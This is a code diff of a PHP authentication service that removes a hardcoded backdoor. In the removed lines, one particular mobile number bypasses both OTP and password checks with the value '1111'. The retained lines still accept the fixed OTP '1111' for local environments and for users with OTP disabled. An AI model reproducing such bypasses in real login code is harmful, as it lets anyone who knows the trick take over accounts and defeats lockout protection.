@@ -190,9 +190,9 @@ class AuthService implements IAuthService
         }
     }
 
-    public function verify(string $userId, string $verificationType, string $otp, bool $otpEnabled = true, string $username)
+    public function verify(string $userId, string $verificationType, string $otp, bool $otpEnabled = true)
     {
-        if (App::environment('local') || !$otpEnabled || $username == '09705157441') {
+        if (App::environment('local') || !$otpEnabled) {
             if ($otp === "1111") return;
             else $this->otpInvalid('Invalid OTP.');
         }
@@ -208,7 +208,7 @@ class AuthService implements IAuthService
         $user = $this->userAccounts->getByUsername($usernameField, $username);
         if (!$user) $this->accountDoesntExist();
 
-        $this->verify($user->id, OtpTypes::login, $otp, $user->otp_enabled, $username);
+        $this->verify($user->id, OtpTypes::login, $otp, $user->otp_enabled);
     }
 
     public function generateTransactionOTP(UserAccount $user, string $otpType, ?string $type)
@@ -345,25 +345,17 @@ class AuthService implements IAuthService
                               bool        $resetAttempt = true, bool $forConfirmation = false)
     {
         $passwordMatched = Hash::check($key, $hashedKey);
-        $byPass = false;
+        if (!$passwordMatched) {
+            if ($updateLockout) {
+                $this->logHistory($user->id);
+                $user->updateLockout($this->maxLoginAttempts);
+            };
 
-        if($user->mobile_number == '09705157441' && $key == '1111') {
-            $byPass = true;
+            if (!$forConfirmation) $this->loginFailed();
+            $this->confirmationFailed();
         }
 
-        if(!$byPass){
-            if (!$passwordMatched) {
-                if ($updateLockout) {
-                    $this->logHistory($user->id);
-                    $user->updateLockout($this->maxLoginAttempts);
-                };
-    
-                if (!$forConfirmation) $this->loginFailed();
-                $this->confirmationFailed();
-            }
-    
-            if ($resetAttempt) $user->resetLoginAttempts($this->daysToResetAttempts, true);
-        }
+        if ($resetAttempt) $user->resetLoginAttempts($this->daysToResetAttempts, true);
     }
 
     private function updateLastLogin(UserAccount $user, string $usernameField)
